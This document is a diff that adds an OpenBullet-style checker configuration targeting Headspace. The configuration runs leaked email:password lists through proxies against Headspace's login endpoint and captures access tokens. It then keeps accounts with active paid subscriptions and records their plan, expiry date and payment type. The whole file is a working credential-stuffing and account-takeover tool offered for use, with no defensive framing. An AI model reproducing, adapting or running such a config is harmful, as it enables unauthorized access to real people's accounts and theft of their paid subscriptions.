@@ -1,0 +1,129 @@
+[SETTINGS]
+{
+  "Name": "HeadSpace",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2020-02-28T19:22:07.8936285+05:30",
+  "AdditionalInfo": "",
+  "Author": "White2001",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Request_for_ID REQUEST GET "https://www.headspace.com/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#ID PARSE "<SOURCE>" LR "\",\"clientId\":\"" "\"" -> VAR "id" 
+
+#Login REQUEST POST "https://auth.headspace.com/co/authenticate" 
+  CONTENT "{\"client_id\":\"<id>\",\"username\":\"<USER>\",\"password\":\"<PASS>\",\"realm\":\"User-Password-Headspace\",\"credential_type\":\"http://auth0.com/oauth/grant-type/password-realm\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Content-Length: 218" 
+  HEADER "Origin: https://www.headspace.com" 
+  HEADER "Connection: keep-alive" 
+
+#Login_ticket_Check KEYCHECK BanOn4XX=TRUE 
+  KEYCHAIN Success OR 
+    KEY "login_ticket" 
+
+#Login_Ticket_Capture PARSE "<SOURCE>" LR "{\"login_ticket\":\"" "\"" -> VAR "tick" 
+
+#Get_Token REQUEST GET "https://auth.headspace.com/authorize?client_id=<id>&response_type=token&response_mode=web_message&redirect_uri=https%3A%2F%2Fwww.headspace.com%2Fauth&scope=openid%20email&audience=https%3A%2F%2Fapi.prod.headspace.com&realm=User-Password-Headspace&state=-QjePbFpc.LZM-peeJCK8ueeyVgjyoCi&login_ticket=<tick>&prompt=none&" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Capture_Token PARSE "<SOURCE>" LR "{\"access_token\":\"" "\"" -> VAR "token" "bearer " "" 
+
+#Get_UserID REQUEST GET "https://api.prod.headspace.com/user/users?userId=" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/vnd.api+json" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "authorization: <token>" 
+  HEADER "X-HS-No-Cache: true" 
+  HEADER "hs-languagepreference: en-US" 
+  HEADER "Origin: https://my.headspace.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://my.headspace.com/profile/stats" 
+
+#Capture_UserID PARSE "<SOURCE>" LR "NORMALUSER\",\"USER:" "\"" -> VAR "user_id" 
+
+#Get_Account_Details REQUEST GET "https://api.prod.headspace.com/user/users?userId=<user_id>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/vnd.api+json" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "authorization: <token>" 
+  HEADER "X-HS-No-Cache: true" 
+  HEADER "hs-languagepreference: en-US" 
+  HEADER "Origin: https://my.headspace.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://my.headspace.com/profile/stats" 
+
+#Check_if_Status_is_Active KEYCHECK BanOn4XX=TRUE 
+  KEYCHAIN Success AND 
+    KEY "status\":\"ACTIVE" 
+    KEY "<SOURCE>" DoesNotContain "subscriptionId\":\"HSSUBS_FREE" 
+
+#Plan PARSE "<SOURCE>" LR "\",\"name\":\"" "\"" CreateEmpty=FALSE -> CAP "Plan" 
+
+#Plan_type PARSE "<SOURCE>" LR "\",\"numMonths\":" "," CreateEmpty=FALSE -> CAP "Plan_Type" "" " Month" 
+
+#Expiry PARSE "<SOURCE>" LR "endDate\":\"" "T" CreateEmpty=FALSE -> CAP "Expiry" 
+
+#Payment_type PARSE "<SOURCE>" LR "description\":\"" "\"" CreateEmpty=FALSE -> CAP "Payment_Type" 
+
